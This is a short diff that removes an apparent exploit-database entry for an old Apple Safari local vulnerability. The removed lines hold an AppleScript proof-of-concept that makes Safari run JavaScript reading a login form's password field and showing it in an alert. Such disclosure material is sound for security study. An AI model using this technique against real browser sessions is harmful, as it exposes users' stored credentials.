@@ -1,7 +1,0 @@
-source: https://www.securityfocus.com/bid/23825/info
-
-Apple Safari is prone to an unspecified local vulnerability.
-
-tell application "Safari"
-        do JavaScript "alert(document.loginform.password.value)" in document 1
-end tell
